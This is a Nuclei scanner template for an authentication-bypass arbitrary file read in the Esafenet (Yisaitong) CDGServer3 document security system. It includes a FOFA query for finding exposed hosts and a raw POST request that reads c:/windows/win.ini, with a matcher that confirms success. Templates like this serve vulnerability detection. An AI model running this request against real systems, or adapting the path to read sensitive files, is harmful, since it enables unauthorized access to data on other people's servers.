id: yisaitong-UploadFileManagerService-fileread

info:
  name: 亿赛通电子文档安全管理系统-文件读取-UploadFileManagerService-login
  author: rain
  severity: high
  metadata:
    fofa-query: body="CDGServer3" || title="电子文档安全管理系统" || cert="esafenet" || body="/help/getEditionInfo.jsp"



http:
  - raw:
      - |
        POST /CDGServer3/document/UploadFileManagerService;login HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
        Content-Type: application/x-www-form-urlencoded
        
        command=ViewUploadFile&filePath=c:/windows/win.ini&fileName1=hello


    matchers:
      - type: dsl
        dsl:
          - status_code==200 && contains_all(body,"[fonts]") 